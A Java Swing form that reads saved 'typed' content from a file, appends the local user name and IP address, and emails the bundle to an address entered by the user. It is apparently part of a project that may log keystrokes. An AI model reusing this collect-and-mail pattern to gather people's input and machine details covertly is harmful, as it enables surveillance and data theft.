//File end.
package View;

import java.awt.FlowLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.net.UnknownHostException;

import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPasswordField;
import javax.swing.JTextField;

import org.apache.commons.mail.EmailException;

import Util.FileUtil;
import Util.GetAddressIpMachineUtil;
import Util.GetUserMachineUtil;
import Util.SendEmailUtil;

public class ViewSendEmail extends JFrame{
	
	FlowLayout layout = new FlowLayout();
	JLabel emailJLabel;
	JTextField emailField;
	JButton sendButton;
	JButton exitButton;
	
	public ViewSendEmail(){
		
		setTitle("Send E-mail !");
		setLayout(layout);
		setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
		setLocationRelativeTo(null);
		setSize(270,120);
		setResizable(false);
		
		emailJLabel = new JLabel("E-mail: ");
		emailField = new JTextField(17);
		add(emailJLabel);
		add(emailField);

		
		sendButton = new JButton("To send");
		exitButton = new JButton("Exit");
		add(sendButton);
		add(exitButton);
		
		sendButton.addActionListener(new ActionListener() {
			
			@Override
			public void actionPerformed(ActionEvent e) {
				String email = emailField.getText();
				String msgTyped = FileUtil.getConteudo();
				String machineUser = GetUserMachineUtil.user();
				String ipAddress = null;
				try{
					ipAddress = GetAddressIpMachineUtil.ipAddress();
				}catch (Exception ex) {
					ipAddress = "none ip";
				}
				
				if(emailField.getText().length() != 0){
					String msgToSend = msgTyped+machineUser+ipAddress;
					
					try {
						SendEmailUtil.send(email, msgToSend);
						JOptionPane.showMessageDialog(null, "E-mail send", "Success E-mail", JOptionPane.INFORMATION_MESSAGE);
					} catch (EmailException e1) {
						// TODO Auto-generated catch block
						System.out.println(e1);
						JOptionPane.showMessageDialog(null, "Error on send E-mail", "Error E-mail", JOptionPane.ERROR_MESSAGE);
					}
				}
				else{
					JOptionPane.showMessageDialog(null, "No typed E-mail", "Error E-mail", JOptionPane.ERROR_MESSAGE);
				}
				
			}
		});
		
		exitButton.addActionListener(new ActionListener() {
			
			@Override
			public void actionPerformed(ActionEvent e) {
				dispose();
				ViewMain vp = new ViewMain();
				vp.setVisible(true);
				
			}
		});
		
	}

}
